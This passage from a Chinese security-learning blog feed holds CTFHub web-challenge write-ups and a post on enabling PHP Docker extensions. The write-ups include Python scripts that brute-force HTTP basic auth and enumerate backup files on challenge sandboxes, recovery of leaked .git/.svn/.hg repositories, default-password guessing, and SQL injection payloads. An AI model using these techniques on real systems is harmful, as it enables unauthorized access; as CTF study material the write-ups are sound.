<span class="hljs-keyword">if</span> (quit == <span class="hljs-string">&#x27;n&#x27;</span> <span class="hljs-keyword">or</span> quit == <span class="hljs-string">&#x27;N&#x27;</span>):<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">continue</span><br>        quit = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;继续切换数据表名吗？(y/n)&quot;</span>)<br>        <span class="hljs-keyword">if</span> (quit == <span class="hljs-string">&#x27;n&#x27;</span> <span class="hljs-keyword">or</span> quit == <span class="hljs-string">&#x27;N&#x27;</span>):<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bye~&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>先给出github地址。</p><p><a href="https://github.com/wuuconix/SQL-Blind-Injection-Auto">wuuconix/SQL-Blind-Injection-Auto: 自己写的SQL盲注自动化脚本 (github.com)</a></p><p>最后再给出演示视频。</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=462667794&bvid=BV1fL411b7b8&cid=397907709&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; Left: 0; top: 0;" ></iframe></div><h2 id="战术总结"><a class="markdownIt-Anchor" href="#战术总结"></a> 战术总结</h2><p>经过这次脚本的编写，我对布尔盲注的原理和实现方式都有了深刻认识。</p><p>同时提升了python脚本的编写能力。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP Docker镜像如何开启拓展</title>
    <link href="/2021/08/26/php-ext/"/>
    <url>/2021/08/26/php-ext/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-nhYVfKjg" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="423314244" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>很久之前，有一个ctf比赛，大家都在俱乐部里使劲。当时我做到了一道php的题目，里面需要用到php插件中的压缩，但是当时我不知道如何开启插件，当时非常苦恼，想着一定要解决一下这个问题，不然以后再遇到这个问题就麻烦了。</p><p>今天在做sql盲注的时候，想现在本地实践一番，写出个脚本再开题目。结果本地上来就给我一个<code>mysqli找不到</code>。我便花了很长时间去寻找开启插件的方法。在<code>php.ini</code>里试了一下，但是都没有成果，最终我开了一眼dockerhub的<a href="https://hub.docker.com/_/php">php镜像说明</a>，豁然开朗，原来镜像开始拓展如此简单。</p><h2 id="解决办法"><a class="markdownIt-Anchor" href="#解决办法"></a> 解决办法</h2><p>官方原话。</p><p><img src="https://upyun.wuuconix.link/image-20210826204044527.png" alt="docker-php-ext" /></p><p>官方提供了几个命令，<code>docker-php-ext-configure</code>、<code>docker-php-ext-install</code>、<code>docker-php-ext-enalbe</code>来轻松地安装拓展。</p><p>但是官方给地例子都是需要在Dockerfile里先运行然后生成镜像的，这貌似有点麻烦。</p><p>然后我在github上发现了这位<a href="https://github.com/docker-library/php/issues/391#issuecomment-346590029">老哥</a>的留言，它说这些命令其实完全可以在容器内部使用。</p><p><img src="https://upyun.wuuconix.link/image-20210826204502118.png" alt="牛逼的老哥" /></p><p>其实我应该想到的，毕竟Dockerfile中的RUN实际上就是执行内部的命令然后生成一个新的镜像。</p><p>这样安装mysqli拓展就显得无比简单了，只需在容器内部执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-php-ext-install mysqli<br>docker-php-ext-enable mysqli <span class="hljs-comment">#实际测试这句话可以不写，会自动应用</span><br>apachectl restart<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210826205257334.png" alt="运行结果" /></p><p><img src="https://upyun.wuuconix.link/image-20210826205455803.png" alt="phpinfo中出现mysqlil" /></p><p><img src="https://upyun.wuuconix.link/image-20210826205620602.png" alt="成功利用mysqli连接" /></p><h2 id="战术总结"><a class="markdownIt-Anchor" href="#战术总结"></a> 战术总结</h2><p>这次算是解决了一个重大历史遗留问题。</p><p>以后php的时候就可以更加游刃有余了。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>php</tag>
      
      <tag>mysql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHUB刷题笔记</title>
    <link href="/2021/08/18/ctfhub/"/>
    <url>/2021/08/18/ctfhub/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-dVoCrtgz" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="28442575" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>本部的阮行止学长推荐了ctf web方向的刷题顺序。这几天太废了，光顾着看JOJO了2333，已经从大乔看到了星辰远征军埃及篇了，今天打算学习学习，不让自己的良心太难受。</p><h2 id="web前置技能"><a class="markdownIt-Anchor" href="#web前置技能"></a> Web前置技能</h2><h3 id="http协议请求方式"><a class="markdownIt-Anchor" href="#http协议请求方式"></a> HTTP协议——请求方式</h3><p>这道题很有意思。</p><p>题目提示说，只有用CTFHUB这个方法请求，才能获得flag。一般的请求方式有GET和POST等，那如何用这个自定义的CTFHUB来请求呢？我想到了HTTP报文中一般会把方法写在开头，比如以下报文就是GET方式请求的。</p><p><img src="https://upyun.wuuconix.link/image-20210818191504901.png" alt="GET请求" /></p><p>我在Burpsuite把GET改成CTFHUB后重新发送请求，就获得了flag。</p><p>那这是怎么实现的呢？我猜测大概率是利用PHP中的全局变量<code>$_SERVER['REQUEST_METHOD']</code>来判断请求方法是什么的。</p><p><img src="https://upyun.wuuconix.link/image-20210818191818501.png" alt="WUUCONIX请求" /></p><h3 id="http协议302跳转"><a class="markdownIt-Anchor" href="#http协议302跳转"></a> HTTP协议——302跳转</h3><p>页面有一个按钮，点击后会到达index.php，但是它返回的状态码是302，我们无法看到内容就被重定向到了原本的index.html。</p><p><img src="https://upyun.wuuconix.link/image-20210819182002895.png" alt="题目主界面" /></p><p>用burpsuite很容易看到302界面的flag。</p><p><img src="https://upyun.wuuconix.link/image-20210819182054109.png" alt="flag" /></p><p>那php是如何实现这种302界面并且实现跳转的呢？搜索一番资料后我发现这种实现非常简单和优美。</p><p><img src="https://upyun.wuuconix.link/image-20210819182632028.png" alt="header函数" /></p><p>我们利用这个神奇的header函数就能够发送原生的http头从而实现跳转。</p><p>效果如下。</p><p><img src="https://upyun.wuuconix.link/image-20210819182801832.png" alt="302的实现" /></p><h3 id="http协议cookie"><a class="markdownIt-Anchor" href="#http协议cookie"></a> HTTP协议——Cookie</h3><p>界面提示只有admin才能获得flag，结合题目cookie，思路很明显。利用burpsuite抓包后发现cookie有admin属性，设置为1之后就能获得flag。</p><p><img src="https://upyun.wuuconix.link/image-20210819183209032.png" alt="cookie-flag" /></p><p>实现也非常简单，用php里的setcookie函数就能够在cookie中设置一个属性，并赋予其默认值。</p><p><img src="https://upyun.wuuconix.link/image-20210819183958184.png" alt="setcookie" /></p><p><img src="https://upyun.wuuconix.link/image-20210819184015543.png" alt="cookie判断实现" /></p><h3 id="http协议基础认证"><a class="markdownIt-Anchor" href="#http协议基础认证"></a> HTTP协议——基础认证</h3><p>这道题需要用到编写脚本了！果然最近荒废了许多，花了20几分钟才做出这道基础题，险些超时。这道题让我了解了一种http原生的基础认证，状态码是401，需要让用户进行输入用户名和密码进行验证。</p><p>抓包后发现<code>WWW-Authenticate</code>字段中有提示。</p><p><img src="https://upyun.wuuconix.link/image-20210819191510686.png" alt="WWW-Authenticate" /></p><p>很显然用户名就是admin了。那密码是什么呢？该题目提供了一个附件，里面有100个密码，那么密码也知道了。</p><p>根据基础认证的流程，用户名和密码经过拼接，再经过base64加密后放在Authentication属性中发送到服务器，服务器对其进行验证。</p><p><img src="https://upyun.wuuconix.link/image-20210819191713024.png" alt="验证流程" /></p><p>但是有100个密码，一个个试太麻烦了，遂用python实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br>burp0_url = <span class="hljs-string">&quot;http://challenge-76a7f08ebaef75b3.sandbox.ctfhub.com:10800/flag.html&quot;</span><br>num = <span class="hljs-number">0</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;10_million_password_list_top_100.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br>        num = num + <span class="hljs-number">1</span><br>        password = line[:-<span class="hljs-number">1</span>]    <span class="hljs-comment">#去掉每行最后的换行符</span><br>        Authorization = <span class="hljs-string">&quot;Basic &quot;</span> + base64.b64encode((<span class="hljs-string">&quot;admin:&quot;</span> + password).encode()).decode()<br>        burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;Authorization&quot;</span>: Authorization&#125;<br>        response = requests.get(burp0_url, headers=burp0_headers).text<br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;ctfhub&quot;</span> <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&quot;</span>, num, <span class="hljs-string">&quot;个密码正确，发现flag&quot;</span>)<br>            <span class="hljs-built_in">print</span>(response)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&quot;</span>, num, <span class="hljs-string">&quot;个密码错误，没有找到flag&quot;</span>)<br></code></pre></td></tr></table></figure><p>代码主题的request部分有burpsuite的插件<code>Copy as Requests</code>自动生成，然后自己设置了一个变量Authentication，遍历所有的密码。</p><p><img src="https://upyun.wuuconix.link/image-20210819191927327.png" alt="脚本跑flag" /></p><p>最终在第84个密码获得了flag。</p><p>这次python脚本编写经历，我发现判断一个字符串中是否含有某个字符实际上非常简单，用in谓词即可。</p><p>这道题看了官方writeup，发现burpsuite的Intruder完全可以代替写脚本，只需要导入密码，然后添加前缀<code>admin:</code>，再最进行base64加密，就可以实现对遍历。</p><p><img src="https://upyun.wuuconix.link/image-20210819194127879.png" alt="burpsuite intruder" /></p><p><img src="https://upyun.wuuconix.link/image-20210819194159435.png" alt="得到正确密码" /></p><p>最后老样子，来自己实现一下http的基础认证。</p><p><img src="https://upyun.wuuconix.link/image-20210819192842196.png" alt="实现http基础认证" /></p><p><img src="https://upyun.wuuconix.link/image-20210819193142666.png" alt="登录框" /></p><p><img src="https://upyun.wuuconix.link/image-20210819193237861.png" alt="登录成功" /></p><p>还是很有可玩性的，以后可以试试。</p><h3 id="http协议相应包源代码"><a class="markdownIt-Anchor" href="#http协议相应包源代码"></a> HTTP协议——相应包源代码</h3><p>F12看到flag，蚌埠住了</p><p><img src="https://upyun.wuuconix.link/image-20210820121753297.png" alt="贪吃蛇F12" /></p><h2 id="信息泄露"><a class="markdownIt-Anchor" href="#信息泄露"></a> 信息泄露</h2><h3 id="目录遍历"><a class="markdownIt-Anchor" href="#目录遍历"></a> 目录遍历</h3><p><img src="https://upyun.wuuconix.link/image-20210820122234335.png" alt="目录" /></p><p><img src="https://upyun.wuuconix.link/image-20210820122304068.png" alt="flag.txt" /></p><p>再<code>/3/1/</code>下找到flag。</p><p>这种apache的文件浏览是怎么做到的呢？</p><p>实际上在某个目录下新建一个.htaccess文件，然后写入以下内容，那么该文件夹里的内容都会被列举出来啦。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">Files</span> *&gt;</span> Options Indexes <span class="hljs-tag">&lt;/<span class="hljs-name">Files</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210820125904991.png" alt="indexes" /></p><p>值得注意的是，html文件点就后会被直接渲染出来，十分有用。以下是<code>test.html</code>的内容和渲染结果。</p><p><img src="https://upyun.wuuconix.link/image-20210820130102239.png" alt="test.html" /></p><img src="https://upyun.wuuconix.link/image-20210820130022575.png" alt="看板娘" style="zoom: 80%;" /><h3 id="phpinfo"><a class="markdownIt-Anchor" href="#phpinfo"></a> PHPINFO</h3><p>这道题太棒了，flag直接藏在phpinfo里面。界面搜索<code>ctfhub</code>不一会儿就在<code>$_ENV['FLAG']</code>里找到了flag。</p><p><img src="https://upyun.wuuconix.link/image-20210820130453899.png" alt="phpinfo里的flag" /></p><p>老习惯，自己也来试试吧吧！</p><p><img src="https://upyun.wuuconix.link/image-20210820132350381.png" alt="$_ENV" /></p><p>比想象的简单，我用的是<code>php:5.6-apache</code>镜像，只要在docker run 的时候加入环境变量即可在phpinfo中展现出来。所以如果在ctf比赛中出题人在出题时用动态flag，这必将利用到环境变量，如果出题人忘记删除掉环境变量，同时我们能够访问到phpinfo的话，就可以直接得到flag，虽然一般都会把环境变量删掉2333。</p><p>以下是docker run语句。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -itd --name php -v <span class="hljs-string">&quot;/root/tools/html:/var/www/html&quot;</span> -p 10000:80 -e FLAG=flag&#123;wuuconix_yyds!&#125; php:5.6-apache<br></code></pre></td></tr></table></figure><h3 id="备份文件下载网站源码"><a class="markdownIt-Anchor" href="#备份文件下载网站源码"></a> 备份文件下载——网站源码</h3><p><img src="https://upyun.wuuconix.link/image-20210823124045706.png" alt="提示" /></p><p>提示很明显了，故用脚本来判断备份文件到底是什么，利用返回的statau_code是不是404，来判断。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>head_list = [<span class="hljs-string">&#x27;web&#x27;</span>, <span class="hljs-string">&#x27;website&#x27;</span>, <span class="hljs-string">&#x27;backup&#x27;</span>, <span class="hljs-string">&#x27;back&#x27;</span>, <span class="hljs-string">&#x27;www&#x27;</span>, <span class="hljs-string">&#x27;wwwroot&#x27;</span>, <span class="hljs-string">&#x27;temp&#x27;</span>]<br>ext_list = [<span class="hljs-string">&#x27;tar&#x27;</span>, <span class="hljs-string">&#x27;tar.gz&#x27;</span>, <span class="hljs-string">&#x27;zip&#x27;</span>, <span class="hljs-string">&#x27;rar&#x27;</span>]<br><span class="hljs-keyword">for</span> head <span class="hljs-keyword">in</span> head_list:<br>    <span class="hljs-keyword">for</span> ext <span class="hljs-keyword">in</span> ext_list:<br>        url = <span class="hljs-string">&quot;http://challenge-a2c8887aa9929362.sandbox.ctfhub.com:10800/&quot;</span><br>        file = head + <span class="hljs-string">&quot;.&quot;</span> + ext<br>        url += file<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;尝试url：&quot;</span>, url)<br>        res = requests.get(url)<br>        <span class="hljs-keyword">if</span> (res.status_code != <span class="hljs-number">404</span>):<br>            <span class="hljs-built_in">print</span>(res.text)  <br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;返回404&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210821224917425.png" alt="www.zip" /></p><p>锁定www.zip，访问网站后会自动下载该压缩包，得到一个文件。</p><p><img src="https://upyun.wuuconix.link/image-20210821225005651.png" alt="flag_111253415.txt" /></p><p>打开后没有flag。</p><p><img src="https://upyun.wuuconix.link/image-20210821225044525.png" alt="where is flag ??" /></p><p>在网页中访问该文件得到flag。</p><p><img src="https://upyun.wuuconix.link/image-20210821225129233.png" alt="flag" /></p><h3 id="备份文件下载bak文件"><a class="markdownIt-Anchor" href="#备份文件下载bak文件"></a> 备份文件下载——bak文件</h3><p><img src="https://upyun.wuuconix.link/image-20210821225548834.png" alt="hint" /></p><p>提示flag就在index.php里，index.php会在某些情况下产生出一些备份文件。我对此进行了罗列。</p><p><img src="https://upyun.wuuconix.link/image-20210821230626015.png" alt="php备份文件后缀罗列" /></p><p>然后利用dirsearch指定这个字典文件，扫描后扫到了<code>index.php.bak</code>，就是题目2333</p><p><img src="https://upyun.wuuconix.link/image-20210821225756406.png" alt="dirsearch -w 指定字典文件" /></p><p>访问下载打开后得到flag。</p><p><img src="https://upyun.wuuconix.link/image-20210821225816354.png" alt="flag" /></p><h3 id="备份文件下载vim缓存"><a class="markdownIt-Anchor" href="#备份文件下载vim缓存"></a> 备份文件下载——vim缓存</h3><p>和上题一样，继续使用dirsearch和我罗列的字典。发现<code>.index.php.swp</code>。这种文件是因为在使用vim编辑过程意外退出产生的，如果继续套娃意外退出，还可能会产生<code>.index.php.swo</code>和<code>.index.php.swn</code>。</p><p><img src="https://upyun.wuuconix.link/image-20210821230953733.png" alt="dirsearch扫描" /></p><p>下载后发现这不是普通的文本文件。vscode打不开。</p><p><img src="https://upyun.wuuconix.link/image-20210821231035885.png" alt="vscode无法打开" /></p><p>在ubuntu里用curl -o下载文件，再用vim -r即可。</p><p><img src="https://upyun.wuuconix.link/image-20210821231134659.png" alt="curl -o下载文件" /></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">vim -r <span class="hljs-selector-class">.index</span><span class="hljs-selector-class">.php</span>.swp<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210821231204982.png" alt="flag" /></p><p>这个vim还挺有趣的，我试了一翻，一开始意外退出是<code>swp</code>然后再次意外退出是<code>swo</code>，这个顺序其实是字母表从后往前推进了。注意下图的时间。不知道到了swa之后会不会是swz呀2333。</p><p><img src="https://upyun.wuuconix.link/image-20210821232126236.png" alt="套娃&quot;意外退出&quot;" /></p><h3 id="备份文件下载ds_store"><a class="markdownIt-Anchor" href="#备份文件下载ds_store"></a> 备份文件下载——.DS_Store</h3><p><img src="https://upyun.wuuconix.link/image-20210822220155355.png" alt=".DS_Store" /></p><p>看来这个<code>.DS_Store</code>是尊贵的Mac OS专享文件。</p><p>在ubuntu里curl -o下载文件，发现flag位置。</p><p><img src="https://upyun.wuuconix.link/image-20210822220726311.png" alt=".DS_Store" /></p><p><img src="https://upyun.wuuconix.link/image-20210822220752194.png" alt="flag" /></p><p>访问后得到flag。</p><p>我发现直接cat 这个文件有些乱码，看了官方的writeup后了解到可以用<a href="https://github.com/gehaxelt/Python-dsstore">gehaxelt/Python-dsstore</a>来看到原本的内容。</p><p>使用之后成功得到原始数据。</p><p><img src="https://upyun.wuuconix.link/image-20210822222446935.png" alt="dsstore" /></p><p>我在我的ubuntu主机上也找了一下<code>.DS_Store</code>。发现一些博客插件里也有.DS_Store 2333，估计它们用的都是尊贵的Mac OS进行开发的，羡慕啊。</p><p><img src="https://upyun.wuuconix.link/image-20210822220934431.png" alt="博客插件里的.DS_Store" /></p><h3 id="git泄露log"><a class="markdownIt-Anchor" href="#git泄露log"></a> Git泄露——Log</h3><p><img src="https://upyun.wuuconix.link/image-20210822224820931.png" alt="题干" /></p><p>这道题太妙了，题干中提示了.git泄露，同时提到了一款强大的工具<a href="https://github.com/BugScanTeam/GitHack">BugScanTeam/GitHack: .git 泄漏利用工具，可还原历史版本 (github.com)</a></p><p><img src="https://upyun.wuuconix.link/image-20210822224948271.png" alt="GitHack运行截图" /></p><p>利用这个GitHack工具可以下载到当前的网页源文件和<code>.git文件夹</code></p><p><img src="https://upyun.wuuconix.link/image-20210822225128772.png" alt="得到了源文件" /></p><p>但是不幸的是，<code>index.html</code>中没有flag。</p><p><img src="https://upyun.wuuconix.link/image-20210822225225938.png" alt="index.html" /></p><p>我又用vscode的搜索功能在整个文件夹下找<code>ctfhub</code>，结果也没有发现flag。</p><p><img src="https://upyun.wuuconix.link/image-20210822225332107.png" alt="vscode 搜索" /></p><p>我陷入了人生和社会的大思考。</p><p>但是我注意到了一个重要信息，这里曾经是有flag的，只不过在某次commit中删除了。</p><p><img src="https://upyun.wuuconix.link/image-20210822225438519.png" alt="remove flag" /></p><p>想了一会儿，我突然意识到git这种东西应该是能恢复到之前的某个状态的，因为自己一直没有使用这个功能，也不适用分支这种，便忽略了这个强大的功能。</p><p>利用<code>git log</code>便能看到所有的变化。</p><p><img src="https://upyun.wuuconix.link/image-20210822225638898.png" alt="git log" /></p><p>然后我们利用<code>git reset --hard commit id</code>来恢复到某个状态，我们这里就选择刚刚添加flag那个commit。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">git <span class="hljs-keyword">reset</span> <span class="hljs-comment">--hard 065ab364a11a0c75abc11340cb882b277827ed02</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210822225840842.png" alt="git reset --hard" /></p><p>然后就会发现文件夹下多了个文本文件，里面就是flag啦。</p><p><img src="https://upyun.wuuconix.link/image-20210822225937737.png" alt="flag" /></p><p>git这种能够回到过去的强大能力让我惊讶，今后也好多多利用好git这个优秀的工具。</p><h3 id="git泄露stash"><a class="markdownIt-Anchor" href="#git泄露stash"></a> Git泄露——Stash</h3><p>查阅了一下资源，git stash是一种将本地项目的状态存储起来的操作，不会上传到github上。</p><p>继续用GitHack恢复<code>.git</code>目录</p><p><img src="https://upyun.wuuconix.link/image-20210823103526208.png" alt=".git" /></p><p>然后输入<code>git stash list</code>就能看到所有的stash存储，发现第一个<code>stash@&#123;0&#125;</code>存储了一个加入flag的状态。</p><p>之后利用<code>git stash apply stash@&#123;0&#125;</code>即可恢复到那一个状态，成功得到flag。</p><p><img src="https://upyun.wuuconix.link/image-20210823103724835.png" alt="flag" /></p><h3 id="git泄露index"><a class="markdownIt-Anchor" href="#git泄露index"></a> Git泄露——Index</h3><p>说是Index，但是我这里githack一恢复，一ls，就有flag了是怎么回事啊23333。</p><p><img src="https://upyun.wuuconix.link/image-20210823105819611.png" alt="自己急着出来的flag" /></p><p>​</p><h3 id="svn泄露"><a class="markdownIt-Anchor" href="#svn泄露"></a> SVN泄露</h3><p>题干没有给出使用的工具。我根据在github上找了两个工具，一个是svnhack，一个是svnexploit，全部都是只能下载当前的源文件，不给你下载最关键的<code>.svn</code>文件夹。但是这道题的flag在旧版本中，现在是没有flag文件的。</p><p>最终无奈地看了writeup。才知道有一个叫做 <a href="https://github.com/kost/dvcs-ripper">kost/dvcs-ripper</a> 的工具。</p><p><img src="https://upyun.wuuconix.link/image-20210823121025710.png" alt="rip-svn" /></p><p><img src="https://upyun.wuuconix.link/image-20210823121138285.png" alt=".svn" /></p><p>有了.svn文件夹后，一般来说所有的文件都会在<code>.svn/pristine</code>有一个备份，包括被删掉的文件。</p><p><img src="https://upyun.wuuconix.link/image-20210823121513596.png" alt="flag" /></p><p>成功得到flag。</p><p>做完后我发现了一个不用这个工具就能得到flag的方法。</p><p>所有的备份文件都会在<code>.svn/pristine</code>这个目录下，然后每个文件比如这个<code>e0a15cc404c2351e8dce038c0c2d1a684419ed1c.svn-base</code></p><p>它就会在<code>.svn/pristine/e0/e0a15cc404c2351e8dce038c0c2d1a684419ed1c.svn-base</code>，这个e0就是文件的前两位。</p><p>所以我们只要知道了<code>e0a15cc404c2351e8dce038c0c2d1a684419ed1c</code>这一串乱码，我们就能锁定文件。</p><p>而这一串乱码可以在<code>.svn/wc.db</code>中找到。</p><p>这里解释一下为什么知道<code>wc.db</code>，因为是dirsearch扫到的，所以我就去看了一眼。</p><p><img src="https://upyun.wuuconix.link/image-20210823122643664.png" alt="wc.db" /></p><p>这里就有两个乱码，分别对应flag文件和index.html。</p><p>最后吐槽一波<a href="https://github.com/admintony/svnExploit">admintony/svnExploit</a>，为什么不把svn文件也一起下载下来 。还有明明已经发现flag文件了，却不给出checksum，这个checksum明明能够通过wc.db获得的。</p><p><img src="https://upyun.wuuconix.link/image-20210823123014093.png" alt="功能不完善的svnExploit" /></p><p>功能完善一下不秒杀这个 <a href="https://github.com/kost/dvcs-ripper">kost/dvcs-ripper</a> ？</p><p>已经在项目下提了一个<a href="https://github.com/admintony/svnExploit/issues/5">Issue</a>，让我们坐等作者更新2333。</p><h3 id="hg泄露"><a class="markdownIt-Anchor" href="#hg泄露"></a> HG泄露</h3><p><img src="https://upyun.wuuconix.link/image-20210824101115497.png" alt="题目" /></p><p>查阅了一下资料，发现hg泄露也可以用昨天那个软件<a href="https://github.com/kost/dvcs-ripper">kost/dvcs-ripper</a>。但是貌似不好使，也不知道出了什么问题。</p><p><img src="https://upyun.wuuconix.link/image-20210824101231796.png" alt="rip-hg" /></p><p>没法，便用dirsearch扫了一下。</p><p><img src="https://upyun.wuuconix.link/image-20210824101322822.png" alt="dirsearch" /></p><p>把几个可访问的文件都下载后，在<code>/.hg/store/undo</code>后发现了flag文件。</p><p><img src="https://upyun.wuuconix.link/image-20210824101511504.png" alt="flag文件" /></p><p>访问后成功得到flag。</p><p><img src="https://upyun.wuuconix.link/image-20210824101607577.png" alt="flag" /></p><p><s>这道题告诉我们不能迷信工具，还得手工尝试。</s></p><p>佛了，做完后才发现那个工具是出结果了的，但是在命令返回结果全是404搞得好像什么都没出，大意了，下次应该用<code>-o</code>指定输出目录。</p><p><img src="https://upyun.wuuconix.link/image-20210824103124831.png" alt=".svn" /></p><h2 id="密码口令"><a class="markdownIt-Anchor" href="#密码口令"></a> 密码口令</h2><h3 id="弱口令"><a class="markdownIt-Anchor" href="#弱口令"></a> 弱口令</h3><p>前几天被vaala称为弱密码带师，结果被这道题卡住了。</p><p><img src="https://upyun.wuuconix.link/image-20210824112517204.png" alt="vaala" /></p><p><img src="https://upyun.wuuconix.link/image-20210824112541899.png" alt="界面" /></p><p>跑了半天，用了好多字典，都不行。无奈看writeup。最后得知密码是admin123。</p><p>再看了看我的拥有19576个密码的密码字典。</p><p><img src="https://upyun.wuuconix.link/image-20210824112644102.png" alt="找不到admin123" /></p><p>留下了眼泪。</p><h3 id="默认口令"><a class="markdownIt-Anchor" href="#默认口令"></a> 默认口令</h3><p>这里让你找亿邮邮件网关的默认口令。滑稽的是，现在查亿邮邮件网关默认口令，查到的却全是ctfhub这道题的writeup。真正的信息来源已经被淹没了。</p><p><img src="https://upyun.wuuconix.link/image-20210824114152558.png" alt="eyou默认口令" /></p><p>测试之后是第二个。</p><p><img src="https://upyun.wuuconix.link/image-20210824114217615.png" alt="flag" /></p><h2 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> SQL注入</h2><h3 id="整数型注入"><a class="markdownIt-Anchor" href="#整数型注入"></a> 整数型注入</h3><p><img src="https://upyun.wuuconix.link/image-20210824123902537.png" alt="输入1" /></p><p>题目给出了完整的sql语句。select * 后页面返回了两个值，一个是ID。一个是Data。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>发现order by 3就不能正常显示了，说明一共就两个字段。我们也有充分的理由怀疑，这两列的字段分别为Id和Data。</p><p>接下来我们需要利用union select来爆信息。union select 的字段的个数需要和主select的个数一直，也就是两个。</p><p>然后如果你这样填。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span 